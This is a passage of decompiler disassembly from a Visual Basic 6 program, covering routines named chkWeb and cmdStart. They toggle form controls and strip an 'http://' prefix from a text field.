007F914D: push 00000005h
007F914F: mov eax, var_78
007F9152: mov eax, [eax]
007F9154: push var_78
007F9157: call [eax+40h]
007F915A: fclex 
007F915C: mov var_7C, eax
007F915F: cmp var_7C, 00000000h
007F9163: jnl 7F917Fh
007F9165: push 00000040h
007F9167: push 00440DE8h
007F916C: push var_78
007F916F: push var_7C
007F9172: call 00410A5Ah ; msvbvm60.dll.__vbaHresultCheckObj
007F9177: mov var_000000C8, eax
007F917D: jmp 7F9186h
007F917F: and var_000000C8, 00000000h
007F9186: mov eax, var_50
007F9189: mov var_80, eax
007F918C: push var_30
007F918F: mov eax, var_80
007F9192: mov eax, [eax]
007F9194: push var_80
007F9197: call [eax+54h]
007F919A: fclex 
007F919C: mov var_00000084, eax
007F91A2: cmp var_00000084, 00000000h
007F91A9: jnl 7F91C8h
007F91AB: push 00000054h
007F91AD: push 004425E4h
007F91B2: push var_80
007F91B5: push var_00000084
007F91BB: call 00410A5Ah ; msvbvm60.dll.__vbaHresultCheckObj
007F91C0: mov var_000000CC, eax
007F91C6: jmp 7F91CFh
007F91C8: and var_000000CC, 00000000h
007F91CF: lea eax, var_50
007F91D2: push eax
007F91D3: lea eax, var_4C
007F91D6: push eax
007F91D7: push 00000002h
007F91D9: call 00410A48h ; msvbvm60.dll.__vbaFreeObjList
007F91DE: add esp, 0000000Ch
007F91E1: mov eax, [ebp+08h]
007F91E4: mov eax, [eax]
007F91E6: push [ebp+08h]
007F91E9: call [eax+00000348h]
007F91EF: push eax
007F91F0: lea eax, var_4C
007F91F3: push eax
007F91F4: call 00410A84h ; Set (object)
007F91F9: mov var_78, eax
007F91FC: lea eax, var_50
007F91FF: push eax
007F9200: push 00000006h
007F9202: mov eax, var_78
007F9205: mov eax, [eax]
007F9207: push var_78
007F920A: call [eax+40h]
007F920D: fclex 
007F920F: mov var_7C, eax
007F9212: cmp var_7C, 00000000h
007F9216: jnl 7F9232h
007F9218: push 00000040h
007F921A: push 00440DE8h
007F921F: push var_78
007F9222: push var_7C
007F9225: call 00410A5Ah ; msvbvm60.dll.__vbaHresultCheckObj
007F922A: mov var_000000D0, eax
007F9230: jmp 7F9239h
007F9232: and var_000000D0, 00000000h
007F9239: mov eax, var_50
007F923C: mov var_80, eax
007F923F: lea eax, var_24
007F9242: push eax
007F9243: lea eax, var_40
007F9246: push eax
007F9247: call 0041097Ch ; msvbvm60.dll.__vbaStrVarVal
007F924C: push eax
007F924D: mov eax, var_80
007F9250: mov eax, [eax]
007F9252: push var_80
007F9255: call [eax+54h]
007F9258: fclex 
007F925A: mov var_00000084, eax
007F9260: cmp var_00000084, 00000000h
007F9267: jnl 7F9286h
007F9269: push 00000054h
007F926B: push 004425E4h
007F9270: push var_80
007F9273: push var_00000084
007F9279: call 00410A5Ah ; msvbvm60.dll.__vbaHresultCheckObj
007F927E: mov var_000000D4, eax
007F9284: jmp 7F928Dh
007F9286: and var_000000D4, 00000000h
007F928D: lea ecx, var_40
007F9290: call 00410A66h ; msvbvm60.dll.__vbaFreeStr
007F9295: lea eax, var_50
007F9298: push eax
007F9299: lea eax, var_4C
007F929C: push eax
007F929D: push 00000002h
007F929F: call 00410A48h ; msvbvm60.dll.__vbaFreeObjList
007F92A4: add esp, 0000000Ch
007F92A7: mov var_04, 00000000h
007F92AE: push 007F931Fh
007F92B3: jmp 7F92E6h
007F92B5: lea eax, var_48
007F92B8: push eax
007F92B9: lea eax, var_44
007F92BC: push eax
007F92BD: lea eax, var_40
007F92C0: push eax
007F92C1: push 00000003h
007F92C3: call 00410A12h ; msvbvm60.dll.__vbaFreeStrList
007F92C8: add esp, 00000010h
007F92CB: lea eax, var_50
007F92CE: push eax
007F92CF: lea eax, var_4C
007F92D2: push eax
007F92D3: push 00000002h
007F92D5: call 00410A48h ; msvbvm60.dll.__vbaFreeObjList
007F92DA: add esp, 0000000Ch
007F92DD: lea ecx, var_60
007F92E0: call 00410A78h ; msvbvm60.dll.__vbaFreeVar
007F92E5: ret 
End Sub

Private sub chkWeb__7EF20F
007EF20F: push ebp
007EF210: mov ebp, esp
007EF212: sub esp, 0000000Ch
007EF215: push 004106A6h ; msvbvm60.dll.__vbaExceptHandler
007EF21A: mov eax, fs:[00h]
007EF220: push eax
007EF221: mov fs:[00000000h], esp
007EF228: push 00000068h
007EF22A: pop eax
007EF22B: call 004106A0h ; msvbvm60.dll.__vbaChkstk
007EF230: push ebx
007EF231: push esi
007EF232: push edi
007EF233: mov var_0C, esp
007EF236: mov var_08, 00409C88h
007EF23D: mov eax, [ebp+08h]
007EF240: and eax, 00000001h
007EF243: mov var_04, eax
007EF246: mov eax, [ebp+08h]
007EF249: and al, FEh
007EF24B: mov [ebp+08h], eax
007EF24E: mov eax, [ebp+08h]
007EF251: mov eax, [eax]
007EF253: push [ebp+08h]
007EF256: call [eax+04h]
007EF259: push 00000000h
007EF25B: push 00000000h
007EF25D: mov eax, [ebp+08h]
007EF260: mov eax, [eax]
007EF262: push [ebp+08h]
007EF265: call [eax+00000374h]
007EF26B: push eax
007EF26C: lea eax, var_18
007EF26F: push eax
007EF270: call 00410A84h ; Set (object)
007EF275: push eax
007EF276: lea eax, var_2C
007EF279: push eax
007EF27A: call 00410A8Ah ; msvbvm60.dll.__vbaLateIdCallLd
007EF27F: add esp, 00000010h
007EF282: push eax
007EF283: call 00410A90h ; msvbvm60.dll.__vbaI4Var
007EF288: dec eax
007EF289: neg eax
007EF28B: sbb eax, eax
007EF28D: inc eax
007EF28E: neg eax
007EF290: mov var_30, ax
007EF294: lea ecx, var_18
007EF297: call 00410A7Eh ; msvbvm60.dll.__vbaFreeObj
007EF29C: lea ecx, var_2C
007EF29F: call 00410A78h ; msvbvm60.dll.__vbaFreeVar
007EF2A4: movsx eax, word ptr var_30
007EF2A8: test eax, eax
007EF2AA: jz 007EF4FAh
007EF2B0: mov eax, [ebp+08h]
007EF2B3: mov eax, [eax]
007EF2B5: push [ebp+08h]
007EF2B8: call [eax+0000031Ch]
007EF2BE: push eax
007EF2BF: lea eax, var_18
007EF2C2: push eax
007EF2C3: call 00410A84h ; Set (object)
007EF2C8: mov var_30, eax
007EF2CB: push FFFFFFFFh
007EF2CD: mov eax, var_30
007EF2D0: mov eax, [eax]
007EF2D2: push var_30
007EF2D5: call [eax+0000008Ch]
007EF2DB: fclex 
007EF2DD: mov var_34, eax
007EF2E0: cmp var_34, 00000000h
007EF2E4: jnl 7EF300h
007EF2E6: push 0000008Ch
007EF2EB: push 00440E08h
007EF2F0: push var_30
007EF2F3: push var_34
007EF2F6: call 00410A5Ah ; msvbvm60.dll.__vbaHresultCheckObj
007EF2FB: mov var_48, eax
007EF2FE: jmp 7EF304h
007EF300: and var_48, 00000000h
007EF304: lea ecx, var_18
007EF307: call 00410A7Eh ; msvbvm60.dll.__vbaFreeObj
007EF30C: mov eax, [ebp+08h]
007EF30F: mov eax, [eax]
007EF311: push [ebp+08h]
007EF314: call [eax+00000318h]
007EF31A: push eax
007EF31B: lea eax, var_18
007EF31E: push eax
007EF31F: call 00410A84h ; Set (object)
007EF324: mov var_30, eax
007EF327: lea eax, var_1C
007EF32A: push eax
007EF32B: push 00000000h
007EF32D: mov eax, var_30
007EF330: mov eax, [eax]
007EF332: push var_30
007EF335: call [eax+40h]
007EF338: fclex 
007EF33A: mov var_34, eax
007EF33D: cmp var_34, 00000000h
007EF341: jnl 7EF35Ah
007EF343: push 00000040h
007EF345: push 00440DE8h
007EF34A: push var_30
007EF34D: push var_34
007EF350: call 00410A5Ah ; msvbvm60.dll.__vbaHresultCheckObj
007EF355: mov var_4C, eax
007EF358: jmp 7EF35Eh
007EF35A: and var_4C, 00000000h
007EF35E: mov eax, var_1C
007EF361: mov var_38, eax
007EF364: push FFFFFFFFh
007EF366: mov eax, var_38
007EF369: mov eax, [eax]
007EF36B: push var_38
007EF36E: call [eax+0000008Ch]
007EF374: fclex 
007EF376: mov var_3C, eax
007EF379: cmp var_3C, 00000000h
007EF37D: jnl 7EF399h
007EF37F: push 0000008Ch
007EF384: push 00440E08h
007EF389: push var_38
007EF38C: push var_3C
007EF38F: call 00410A5Ah ; msvbvm60.dll.__vbaHresultCheckObj
007EF394: mov var_50, eax
007EF397: jmp 7EF39Dh
007EF399: and var_50, 00000000h
007EF39D: lea eax, var_1C
007EF3A0: push eax
007EF3A1: lea eax, var_18
007EF3A4: push eax
007EF3A5: push 00000002h
007EF3A7: call 00410A48h ; msvbvm60.dll.__vbaFreeObjList
007EF3AC: add esp, 0000000Ch
007EF3AF: mov eax, [ebp+08h]
007EF3B2: mov eax, [eax]
007EF3B4: push [ebp+08h]
007EF3B7: call [eax+00000318h]
007EF3BD: push eax
007EF3BE: lea eax, var_18
007EF3C1: push eax
007EF3C2: call 00410A84h ; Set (object)
007EF3C7: mov var_30, eax
007EF3CA: lea eax, var_1C
007EF3CD: push eax
007EF3CE: push 00000001h
007EF3D0: mov eax, var_30
007EF3D3: mov eax, [eax]
007EF3D5: push var_30
007EF3D8: call [eax+40h]
007EF3DB: fclex 
007EF3DD: mov var_34, eax
007EF3E0: cmp var_34, 00000000h
007EF3E4: jnl 7EF3FDh
007EF3E6: push 00000040h
007EF3E8: push 00440DE8h
007EF3ED: push var_30
007EF3F0: push var_34
007EF3F3: call 00410A5Ah ; msvbvm60.dll.__vbaHresultCheckObj
007EF3F8: mov var_54, eax
007EF3FB: jmp 7EF401h
007EF3FD: and var_54, 00000000h
007EF401: mov eax, var_1C
007EF404: mov var_38, eax
007EF407: push FFFFFFFFh
007EF409: mov eax, var_38
007EF40C: mov eax, [eax]
007EF40E: push var_38
007EF411: call [eax+0000008Ch]
007EF417: fclex 
007EF419: mov var_3C, eax
007EF41C: cmp var_3C, 00000000h
007EF420: jnl 7EF43Ch
007EF422: push 0000008Ch
007EF427: push 00440E08h
007EF42C: push var_38
007EF42F: push var_3C
007EF432: call 00410A5Ah ; msvbvm60.dll.__vbaHresultCheckObj
007EF437: mov var_58, eax
007EF43A: jmp 7EF440h
007EF43C: and var_58, 00000000h
007EF440: lea eax, var_1C
007EF443: push eax
007EF444: lea eax, var_18
007EF447: push eax
007EF448: push 00000002h
007EF44A: call 00410A48h ; msvbvm60.dll.__vbaFreeObjList
007EF44F: add esp, 0000000Ch
007EF452: mov eax, [ebp+08h]
007EF455: mov eax, [eax]
007EF457: push [ebp+08h]
007EF45A: call [eax+00000318h]
007EF460: push eax
007EF461: lea eax, var_18
007EF464: push eax
007EF465: call 00410A84h ; Set (object)
007EF46A: mov var_30, eax
007EF46D: lea eax, var_1C
007EF470: push eax
007EF471: push 00000002h
007EF473: mov eax, var_30
007EF476: mov eax, [eax]
007EF478: push var_30
007EF47B: call [eax+40h]
007EF47E: fclex 
007EF480: mov var_34, eax
007EF483: cmp var_34, 00000000h
007EF487: jnl 7EF4A0h
007EF489: push 00000040h
007EF48B: push 00440DE8h
007EF490: push var_30
007EF493: push var_34
007EF496: call 00410A5Ah ; msvbvm60.dll.__vbaHresultCheckObj
007EF49B: mov var_5C, eax
007EF49E: jmp 7EF4A4h
007EF4A0: and var_5C, 00000000h
007EF4A4: mov eax, var_1C
007EF4A7: mov var_38, eax
007EF4AA: push FFFFFFFFh
007EF4AC: mov eax, var_38
007EF4AF: mov eax, [eax]
007EF4B1: push var_38
007EF4B4: call [eax+0000008Ch]
007EF4BA: fclex 
007EF4BC: mov var_3C, eax
007EF4BF: cmp var_3C, 00000000h
007EF4C3: jnl 7EF4DFh
007EF4C5: push 0000008Ch
007EF4CA: push 00440E08h
007EF4CF: push var_38
007EF4D2: push var_3C
007EF4D5: call 00410A5Ah ; msvbvm60.dll.__vbaHresultCheckObj
007EF4DA: mov var_60, eax
007EF4DD: jmp 7EF4E3h
007EF4DF: and var_60, 00000000h
007EF4E3: lea eax, var_1C
007EF4E6: push eax
007EF4E7: lea eax, var_18
007EF4EA: push eax
007EF4EB: push 00000002h
007EF4ED: call 00410A48h ; msvbvm60.dll.__vbaFreeObjList
007EF4F2: add esp, 0000000Ch
007EF4F5: jmp 007EF73Fh
007EF4FA: mov eax, [ebp+08h]
007EF4FD: mov eax, [eax]
007EF4FF: push [ebp+08h]
007EF502: call [eax+0000031Ch]
007EF508: push eax
007EF509: lea eax, var_18
007EF50C: push eax
007EF50D: call 00410A84h ; Set (object)
007EF512: mov var_30, eax
007EF515: push 00000000h
007EF517: mov eax, var_30
007EF51A: mov eax, [eax]
007EF51C: push var_30
007EF51F: call [eax+0000008Ch]
007EF525: fclex 
007EF527: mov var_34, eax
007EF52A: cmp var_34, 00000000h
007EF52E: jnl 7EF54Ah
007EF530: push 0000008Ch
007EF535: push 00440E08h
007EF53A: push var_30
007EF53D: push var_34
007EF540: call 00410A5Ah ; msvbvm60.dll.__vbaHresultCheckObj
007EF545: mov var_64, eax
007EF548: jmp 7EF54Eh
007EF54A: and var_64, 00000000h
007EF54E: lea ecx, var_18
007EF551: call 00410A7Eh ; msvbvm60.dll.__vbaFreeObj
007EF556: mov eax, [ebp+08h]
007EF559: mov eax, [eax]
007EF55B: push [ebp+08h]
007EF55E: call [eax+00000318h]
007EF564: push eax
007EF565: lea eax, var_18
007EF568: push eax
007EF569: call 00410A84h ; Set (object)
007EF56E: mov var_30, eax
007EF571: lea eax, var_1C
007EF574: push eax
007EF575: push 00000000h
007EF577: mov eax, var_30
007EF57A: mov eax, [eax]
007EF57C: push var_30
007EF57F: call [eax+40h]
007EF582: fclex 
007EF584: mov var_34, eax
007EF587: cmp var_34, 00000000h
007EF58B: jnl 7EF5A4h
007EF58D: push 00000040h
007EF58F: push 00440DE8h
007EF594: push var_30
007EF597: push var_34
007EF59A: call 00410A5Ah ; msvbvm60.dll.__vbaHresultCheckObj
007EF59F: mov var_68, eax
007EF5A2: jmp 7EF5A8h
007EF5A4: and var_68, 00000000h
007EF5A8: mov eax, var_1C
007EF5AB: mov var_38, eax
007EF5AE: push 00000000h
007EF5B0: mov eax, var_38
007EF5B3: mov eax, [eax]
007EF5B5: push var_38
007EF5B8: call [eax+0000008Ch]
007EF5BE: fclex 
007EF5C0: mov var_3C, eax
007EF5C3: cmp var_3C, 00000000h
007EF5C7: jnl 7EF5E3h
007EF5C9: push 0000008Ch
007EF5CE: push 00440E08h
007EF5D3: push var_38
007EF5D6: push var_3C
007EF5D9: call 00410A5Ah ; msvbvm60.dll.__vbaHresultCheckObj
007EF5DE: mov var_6C, eax
007EF5E1: jmp 7EF5E7h
007EF5E3: and var_6C, 00000000h
007EF5E7: lea eax, var_1C
007EF5EA: push eax
007EF5EB: lea eax, var_18
007EF5EE: push eax
007EF5EF: push 00000002h
007EF5F1: call 00410A48h ; msvbvm60.dll.__vbaFreeObjList
007EF5F6: add esp, 0000000Ch
007EF5F9: mov eax, [ebp+08h]
007EF5FC: mov eax, [eax]
007EF5FE: push [ebp+08h]
007EF601: call [eax+00000318h]
007EF607: push eax
007EF608: lea eax, var_18
007EF60B: push eax
007EF60C: call 00410A84h ; Set (object)
007EF611: mov var_30, eax
007EF614: lea eax, var_1C
007EF617: push eax
007EF618: push 00000001h
007EF61A: mov eax, var_30
007EF61D: mov eax, [eax]
007EF61F: push var_30
007EF622: call [eax+40h]
007EF625: fclex 
007EF627: mov var_34, eax
007EF62A: cmp var_34, 00000000h
007EF62E: jnl 7EF647h
007EF630: push 00000040h
007EF632: push 00440DE8h
007EF637: push var_30
007EF63A: push var_34
007EF63D: call 00410A5Ah ; msvbvm60.dll.__vbaHresultCheckObj
007EF642: mov var_70, eax
007EF645: jmp 7EF64Bh
007EF647: and var_70, 00000000h
007EF64B: mov eax, var_1C
007EF64E: mov var_38, eax
007EF651: push 00000000h
007EF653: mov eax, var_38
007EF656: mov eax, [eax]
007EF658: push var_38
007EF65B: call [eax+0000008Ch]
007EF661: fclex 
007EF663: mov var_3C, eax
007EF666: cmp var_3C, 00000000h
007EF66A: jnl 7EF686h
007EF66C: push 0000008Ch
007EF671: push 00440E08h
007EF676: push var_38
007EF679: push var_3C
007EF67C: call 00410A5Ah ; msvbvm60.dll.__vbaHresultCheckObj
007EF681: mov var_74, eax
007EF684: jmp 7EF68Ah
007EF686: and var_74, 00000000h
007EF68A: lea eax, var_1C
007EF68D: push eax
007EF68E: lea eax, var_18
007EF691: push eax
007EF692: push 00000002h
007EF694: call 00410A48h ; msvbvm60.dll.__vbaFreeObjList
007EF699: add esp, 0000000Ch
007EF69C: mov eax, [ebp+08h]
007EF69F: mov eax, [eax]
007EF6A1: push [ebp+08h]
007EF6A4: call [eax+00000318h]
007EF6AA: push eax
007EF6AB: lea eax, var_18
007EF6AE: push eax
007EF6AF: call 00410A84h ; Set (object)
007EF6B4: mov var_30, eax
007EF6B7: lea eax, var_1C
007EF6BA: push eax
007EF6BB: push 00000002h
007EF6BD: mov eax, var_30
007EF6C0: mov eax, [eax]
007EF6C2: push var_30
007EF6C5: call [eax+40h]
007EF6C8: fclex 
007EF6CA: mov var_34, eax
007EF6CD: cmp var_34, 00000000h
007EF6D1: jnl 7EF6EAh
007EF6D3: push 00000040h
007EF6D5: push 00440DE8h
007EF6DA: push var_30
007EF6DD: push var_34
007EF6E0: call 00410A5Ah ; msvbvm60.dll.__vbaHresultCheckObj
007EF6E5: mov var_78, eax
007EF6E8: jmp 7EF6EEh
007EF6EA: and var_78, 00000000h
007EF6EE: mov eax, var_1C
007EF6F1: mov var_38, eax
007EF6F4: push 00000000h
007EF6F6: mov eax, var_38
007EF6F9: mov eax, [eax]
007EF6FB: push var_38
007EF6FE: call [eax+0000008Ch]
007EF704: fclex 
007EF706: mov var_3C, eax
007EF709: cmp var_3C, 00000000h
007EF70D: jnl 7EF729h
007EF70F: push 0000008Ch
007EF714: push 00440E08h
007EF719: push var_38
007EF71C: push var_3C
007EF71F: call 00410A5Ah ; msvbvm60.dll.__vbaHresultCheckObj
007EF724: mov var_7C, eax
007EF727: jmp 7EF72Dh
007EF729: and var_7C, 00000000h
007EF72D: lea eax, var_1C
007EF730: push eax
007EF731: lea eax, var_18
007EF734: push eax
007EF735: push 00000002h
007EF737: call 00410A48h ; msvbvm60.dll.__vbaFreeObjList
007EF73C: add esp, 0000000Ch
007EF73F: mov var_04, 00000000h
007EF746: push 007EF769h
007EF74B: jmp 7EF768h
007EF74D: lea eax, var_1C
007EF750: push eax
007EF751: lea eax, var_18
007EF754: push eax
007EF755: push 00000002h
007EF757: call 00410A48h ; msvbvm60.dll.__vbaFreeObjList
007EF75C: add esp, 0000000Ch
007EF75F: lea ecx, var_2C
007EF762: call 00410A78h ; msvbvm60.dll.__vbaFreeVar
007EF767: ret 
End Sub

Private sub cmdStart__7EF788
007EF788: push ebp
007EF789: mov ebp, esp
007EF78B: sub esp, 00000018h
007EF78E: push 004106A6h ; msvbvm60.dll.__vbaExceptHandler
007EF793: mov eax, fs:[00h]
007EF799: push eax
007EF79A: mov fs:[00000000h], esp
007EF7A1: mov eax, 00000600h
007EF7A6: call 004106A0h ; msvbvm60.dll.__vbaChkstk
007EF7AB: push ebx
007EF7AC: push esi
007EF7AD: push edi
007EF7AE: mov var_18, esp
007EF7B1: mov var_14, 00409C98h
007EF7B8: mov eax, [ebp+08h]
007EF7BB: and eax, 00000001h
007EF7BE: mov var_10, eax
007EF7C1: mov eax, [ebp+08h]
007EF7C4: and al, FEh
007EF7C6: mov [ebp+08h], eax
007EF7C9: mov var_0C, 00000000h
007EF7D0: mov eax, [ebp+08h]
007EF7D3: mov eax, [eax]
007EF7D5: push [ebp+08h]
007EF7D8: call [eax+04h]
007EF7DB: mov var_04, 00000001h
007EF7E2: mov var_04, 00000002h
007EF7E9: push FFFFFFFFh
007EF7EB: call 00410A60h ; On Error ...
007EF7F0: mov var_04, 00000003h
007EF7F7: push 0041170Ch
007EF7FC: call 0041081Ah ; msvbvm60.dll.__vbaNew
007EF801: push eax
007EF802: lea eax, var_48
007EF805: push eax
007EF806: call 00410A84h ; Set (object)
007EF80B: mov var_04, 00000004h
007EF812: mov eax, [ebp+08h]
007EF815: mov eax, [eax]
007EF817: push [ebp+08h]
007EF81A: call [eax+000002FCh]
007EF820: push eax
007EF821: lea eax, var_70
007EF824: push eax
007EF825: call 00410A84h ; Set (object)
007EF82A: mov var_000001F0, eax
007EF830: lea eax, var_000001CC
007EF836: push eax
007EF837: mov eax, var_000001F0
007EF83D: mov eax, [eax]
007EF83F: push var_000001F0
007EF845: call [eax+000000E0h]
007EF84B: fclex 
007EF84D: mov var_000001F4, eax
007EF853: cmp var_000001F4, 00000000h
007EF85A: jnl 7EF87Fh
007EF85C: push 000000E0h
007EF861: push 00440DF8h
007EF866: push var_000001F0
007EF86C: push var_000001F4
007EF872: call 00410A5Ah ; msvbvm60.dll.__vbaHresultCheckObj
007EF877: mov var_000003EC, eax
007EF87D: jmp 7EF886h
007EF87F: and var_000003EC, 00000000h
007EF886: xor eax, eax
007EF888: cmp word ptr var_000001CC, 0001h
007EF890: setz al
007EF893: neg eax
007EF895: mov var_000001F8, ax
007EF89C: lea ecx, var_70
007EF89F: call 00410A7Eh ; msvbvm60.dll.__vbaFreeObj
007EF8A4: movsx eax, word ptr var_000001F8
007EF8AB: test eax, eax
007EF8AD: jz 007EFD35h
007EF8B3: mov var_04, 00000005h
007EF8BA: mov eax, [ebp+08h]
007EF8BD: mov eax, [eax]
007EF8BF: push [ebp+08h]
007EF8C2: call [eax+00000344h]
007EF8C8: mov var_0000008C, eax
007EF8CE: mov var_00000094, 00000009h
007EF8D8: mov var_00000150, 004506DCh ; http://
007EF8E2: mov var_00000158, 00000008h
007EF8EC: and var_00000160, 00000000h
007EF8F3: mov var_00000168, 00008002h
007EF8FD: push 00000001h
007EF8FF: lea eax, var_00000094
007EF905: push eax
007EF906: lea eax, var_00000158
007EF90C: push eax
007EF90D: push 00000000h
007EF90F: lea eax, var_000000A4
007EF915: push eax
007EF916: call 0041083Eh ; InStr
007EF91B: push eax
007EF91C: lea eax, var_00000168
007EF922: push eax
007EF923: call 0041091Ch ; msvbvm60.dll.__vbaVarTstGt
007EF928: mov var_000001F0, ax
007EF92F: lea eax, var_000000A4
007EF935: push eax
007EF936: lea eax, var_00000094
007EF93C: push eax
007EF93D: push 00000002h
007EF93F: call 00410A42h ; msvbvm60.dll.__vbaFreeVarList
007EF944: add esp, 0000000Ch
007EF947: movsx eax, word ptr var_000001F0
007EF94E: test eax, eax
007EF950: jz 007EFA7Fh
007EF956: mov var_04, 00000006h
007EF95D: mov eax, [ebp+08h]
007EF960: mov eax, [eax]
007EF962: push [ebp+08h]
007EF965: call [eax+00000344h]
007EF96B: push eax
007EF96C: lea eax, var_70
007EF96F: push eax
007EF970: call 00410A84h ; Set (object)
007EF975: mov var_000001F0, eax
007EF97B: lea eax, var_54
007EF97E: push eax
007EF97F: mov eax, var_000001F0
007EF985: mov eax, [eax]
007EF987: push var_000001F0
007EF98D: call [eax+000000A0h]
007EF993: fclex 
007EF995: mov var_000001F4, eax
007EF99B: cmp var_000001F4, 00000000h
007EF9A2: jnl 7EF9C7h
007EF9A4: push 000000A0h
007EF9A9: push 00440E08h
007EF9AE: push var_000001F0
007EF9B4: push var_000001F4
007EF9BA: call 00410A5Ah ; msvbvm60.dll.__vbaHresultCheckObj
007EF9BF: mov var_000003F0, eax
007EF9C5: jmp 7EF9CEh
007EF9C7: and var_000003F0, 00000000h
007EF9CE: mov eax, [ebp+08h]
007EF9D1: mov eax, [eax]
007EF9D3: push [ebp+08h]
007EF9D6: call [eax+00000344h]
007EF9DC: push eax
007EF9DD: lea eax, var_74
007EF9E0: push eax
007EF9E1: call 00410A84h ; Set (object)
007EF9E6: mov var_000001F8, eax
007EF9EC: push 00000000h
007EF9EE: push FFFFFFFFh
007EF9F0: push 00000001h
007EF9F2: push 00000000h
007EF9F4: push 004506DCh ; http://
007EF9F9: push var_54
007EF9FC: call 00410988h ; Replace(arg_1, arg_2, arg_3, arg_4, arg_5, arg_6)
007EFA01: mov edx, eax
007EFA03: lea ecx, var_58
007EFA06: call 00410A24h ; msvbvm60.dll.__vbaStrMove
007EFA0B: push eax
007EFA0C: mov eax, var_000001F8
007EFA12: mov eax, [eax]
007EFA14: push var_000001F8
007EFA1A: call [eax+000000A4h]
007EFA20: fclex 
007EFA22: mov var_000001FC, eax
007EFA28: cmp var_000001FC, 00000000h
007EFA2F: jnl 7EFA54h
007EFA31: push 000000A4h
007EFA36: push 00440E08h
007EFA3B: push var_000001F8
007EFA41: push var_000001FC
007EFA47: call 00410A5Ah ; msvbvm60.dll.__vbaHresultCheckObj
007EFA4C: mov var_000003F4, eax
007EFA52: jmp 7EFA5Bh
007EFA54: and var_000003F4, 00000000h
007EFA5B: lea eax, var_58
007EFA5E: push eax
007EFA5F: lea eax, var_54
007EFA62: push eax
007EFA63: push 00000002h
007EFA65: call 00410A12h ; msvbvm60.dll.__vbaFreeStrList
007EFA6A: add esp, 0000000Ch
007EFA6D: lea eax, var_74
007EFA70: push eax
007EFA71: lea eax, var_70
007EFA74: push eax
007EFA75: push 00000002h
007EFA77: call 00410A48h ; msvbvm60.dll.__vbaFreeObjList
007EFA7C: add esp, 0000000Ch
007EFA7F: mov var_04, 00000008h
007EFA86: mov eax, [ebp+08h]
007EFA89: mov eax, [eax]
007EFA8B: push [ebp+08h]
007EFA8E: call [eax+00000344h]
007EFA94: push eax
007EFA95: lea eax, var_74
007EFA98: push eax
007EFA99: call 00410A84h ; Set (object)
007EFA9E: mov var_000001FC, eax
007EFAA4: mov eax, [ebp+08h]
007EFAA7: mov eax, [eax]
007EFAA9: push [ebp+08h]
007EFAAC: call [eax+00000344h]
007EFAB2: push eax
007EFAB3: lea eax, var_70
007EFAB6: push eax
007EFAB7: call 00410A84h ; Set (object)
007EFABC: mov var_000001F0, eax
007EFAC2: lea eax, var_54
007EFAC5: push eax
007EFAC6: mov eax, var_000001F0
007EFACC: mov eax, [eax]
007EFACE: push var_000001F0
007EFAD4: call [eax+000000A0h]
007EFADA: fclex 
007EFADC: mov var_000001F4, eax
007EFAE2: cmp var_000001F4, 00000000h
007EFAE9: jnl 7EFB0Eh
007EFAEB: push 000000A0h
007EFAF0: push 00440E08h
007EFAF5: push var_000001F0
007EFAFB: push var_000001F4
007EFB01: call 00410A5Ah ; msvbvm60.dll.__vbaHresultCheckObj
007EFB06: mov var_000003F8, eax
007EFB0C: jmp 7EFB15h
007EFB0E: and var_000003F8, 00000000h
007EFB15: lea eax, var_58
007EFB18: push eax
007EFB19: push var_54
007EFB1C: mov eax, var_48
007EFB1F: mov eax, [eax]
007EFB21: push var_48
007EFB24: call [eax+1Ch]
007EFB27: fclex 
007EFB29: mov var_000001F8, eax
007EFB2F: cmp var_000001F8, 00000000h
007EFB36: jnl 7EFB55h
007EFB38: push 0000001Ch
007EFB3A: push 004505C8h
007EFB3F: push var_48
007EFB42: push var_000001F8
007EFB48: call 00410A5Ah ; msvbvm60.dll.__vbaHresultCheckObj
007EFB4D: mov var_000003FC, eax
007EFB53: jmp 7EFB5Ch
007EFB55: and var_000003FC, 00000000h
007EFB5C: push var_58
007EFB5F: mov eax, var_000001FC
007EFB65: mov eax, [eax]
007EFB67: push var_000001FC
007EFB6D: call [eax+000000A4h]
007EFB73: fclex 
007EFB75: mov var_00000200, eax
007EFB7B: cmp var_00000200, 00000000h
007EFB82: jnl 7EFBA7h
007EFB84: push 000000A4h
007EFB89: push 00440E08h
007EFB8E: push var_000001FC
007EFB94: push var_00000200
007EFB9A: call 00410A5Ah ; msvbvm60.dll.__vbaHresultCheckObj
007EFB9F: mov var_00000400, eax
007EFBA5: jmp 7EFBAEh
007EFBA7: and var_00000400, 00000000h
007EFBAE: lea eax, var_58
007EFBB1: push eax
007EFBB2: lea eax, var_54
007EFBB5: push eax
007EFBB6: push 00000002h
007EFBB8: call 00410A12h ; msvbvm60.dll.__vbaFreeStrList
007EFBBD: add esp, 0000000Ch
007EFBC0: lea eax, var_74
007EFBC3: push eax
007EFBC4: lea eax, var_70
007EFBC7: push eax
007EFBC8: push 00000002h
007EFBCA: call 00410A48h ; msvbvm60.dll.__vbaFreeObjList
007EFBCF: add esp, 0000000Ch
007EFBD2: mov var_04, 00000009h
007EFBD9: mov eax, [ebp+08h]
007EFBDC: mov eax, [eax]
007EFBDE: push [ebp+08h]
007EFBE1: call [eax+00000344h]
007EFBE7: push eax
007EFBE8: lea eax, var_70
007EFBEB: push eax
007EFBEC: call 00410A84h ; Set (object)
007EFBF1: mov var_000001F0, eax
007EFBF7: lea eax, var_54
007EFBFA: push eax
007EFBFB: mov eax, var_000001F0
007EFC01: mov eax, [eax]
007EFC03: push var_000001F0
007EFC09: call [eax+000000A0h]
007EFC0F: fclex 
007EFC11: mov var_000001F4, eax
007EFC17: cmp var_000001F4, 00000000h
007EFC1E: jnl 7EFC43h
007EFC20: push 000000A0h
007EFC25: push 00440E08h
007EFC2A: push var_000001F0
007EFC30: push var_000001F4
007EFC36: call 00410A5Ah ; msvbvm60.dll.__vbaHresultCheckObj
007EFC3B: mov var_00000404, eax
007EFC41: jmp 7EFC4Ah
007EFC43: and var_00000404, 00000000h
007EFC4A: push var_54
007EFC4D: call 0041098Eh ; Len(arg_1)
007EFC52: neg eax
007EFC54: sbb eax, eax
007EFC56: inc eax
007EFC57: neg eax
007EFC59: mov var_000001F8, ax
007EFC60: lea ecx, var_54
007EFC63: call 00410A66h ; msvbvm60.dll.__vbaFreeStr
007EFC68: lea ecx, var_70
007EFC6B: call 00410A7Eh ; msvbvm60.dll.__vbaFreeObj
007EFC70: movsx eax, word ptr var_000001F8
007EFC77: test eax, eax
007EFC79: jz 007EFD35h
007EFC7F: mov var_04, 0000000Ah
007EFC86: mov var_000000BC, 80020004h
007EFC90: mov var_000000C4, 0000000Ah
007EFC9A: mov var_000000AC, 80020004h
